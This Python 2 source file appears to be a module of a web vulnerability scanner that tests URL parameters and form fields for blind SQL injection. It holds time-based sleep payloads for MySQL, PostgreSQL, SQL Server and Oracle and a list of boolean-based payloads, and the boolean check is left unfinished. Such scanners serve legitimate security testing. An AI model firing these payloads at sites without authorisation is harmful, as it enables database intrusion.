from utils import add_url_params, change_url_params, get_url_host, get_form_params, POST, GET
from urlparse import urlparse, urljoin
from client import NotAPage, RedirectedToExternal

import copy

#(select(0)from(select(sleep({0})))v)/*'+(select(0)from(select(sleep({0})))v)+'\"+(select(0)from(select(sleep({0})))v)+\"*/
TIME_INJECTIONS = {
    "MySQL": ("(select(0)from(select(sleep({0})))v)/*'+(select(0)from(select(sleep({0})))v)+'\"+(select(0)from(select(sleep({0})))v)+\"*/", "if(now()=sysdate(),sleep({0}),0)/*'XOR(if(now()=sysdate(),sleep({0}),0))OR'\"XOR(if(now()=sysdate(),sleep({0}),0))OR\"*/",),
    "PostgreSQL": (";SELECT pg_sleep({0})--", ");SELECT pg_sleep({0})--", "';SELECT pg_sleep({0})--", "');SELECT pg_sleep({0})--", "));SELECT pg_sleep({0})--", "'));SELECT pg_sleep({0})--", "SELECT pg_sleep({0})--"),
    "Microsoft SQL Server": ("; WAIT FOR DELAY '00:00:{0}'",),
    "Oracle": ("BEGIN DBMS_LOCK.SLEEP({0}); END;",),
}

BOOLEAN_INJECTIONS = {
    "%20AND%203*2*1=6%20AND%20119=119": True,
    "%20AND%203*2*2=6%20AND%20119=119": False,
    "%20AND%203*2*1=6%20AND%20119=118": False,
    "%20AND%205*4=20%20AND%20119=119": True,
    "%20AND%205*4=21%20AND%20119=119": False,
    "%20AND%207*7>48%20AND%20119=119": True
}

def sql_blind(page, client):
    print "Scanning SQL Blind in page {}".format(page.url)
    parsed_url = urlparse(page.url)

    if parsed_url.query:
        time_based_blind(client, page.url, method=GET)
        # boolean_blind(client, page)

    for form in page.get_forms():
        action = urljoin(page.url, form.get('action'))

        if get_url_host(page.url) != get_url_host(action):
            continue

        method = form.get('method') or GET
        params = get_form_params(form)

        time_based_blind(client, action, method, params)


# def boolean_blind(client, page):
#     for inj, is_correct in BOOLEAN_INJECTIONS.iteritems():



def time_based_blind(client, action, method, params=None):
    report = {}
    if params:
        injectable, immutable = params
    else:
        injectable, immutable = {}, {}

    if urlparse(action).query:
        for db, injections in TIME_INJECTIONS.iteritems():
            for inj in injections:
                successed = []
                for t in xrange(0, 10, 3):
                    payload = inj.format(t)
                    injected_action = change_url_params(action, payload)

                    inject = copy.deepcopy(injectable)
                    inject.update(immutable)

                    try:
                        print method, injected_action, inject
                        req_time = request_injection(client, injected_action, method, inject).response.elapsed.total_seconds()
                        successed.append([t, req_time])
                    except NotAPage:
                        continue
                    except RedirectedToExternal:
                        continue

                print successed
                if successed and all(t <= rt for t, rt in successed):
                    print 'SQL blind db {} in form {} param {} injection {}'.format(db, action, urlparse(action).query, payload)


    for param in injectable.keys():
        for db, injections in TIME_INJECTIONS.iteritems():
            for inj in injections:
                successed = []
                for t in xrange(0, 10, 3):
                    payload = inj.format(t)

                    inject = inject_param(injectable, param, payload)
                    inject.update(immutable)

                    try:
                        req_time = request_injection(client, action, method, inject).response.elapsed.total_seconds()
                        successed.append([t, req_time])
                    except NotAPage:
                        continue
                    except RedirectedToExternal:
                        continue

                print successed
                if successed and all(t <= rt for t, rt in successed):
                    print 'SQL blind db {} in form {} param {} injection {}'.format(db, action, urlparse(action).query, payload)


def inject_param(parameters, param, injection):
    injected = copy.deepcopy(parameters)
    injected[param] = injection
    return injected

def request_injection(client, url, method, inject):
    # print method, url, inject
    if method.lower() == POST.lower():
        res_page = client.post_req(url, data=inject)
    else:
        injected_url = add_url_params(url, inject)
        res_page = client.get_req(injected_url)

    return res_page
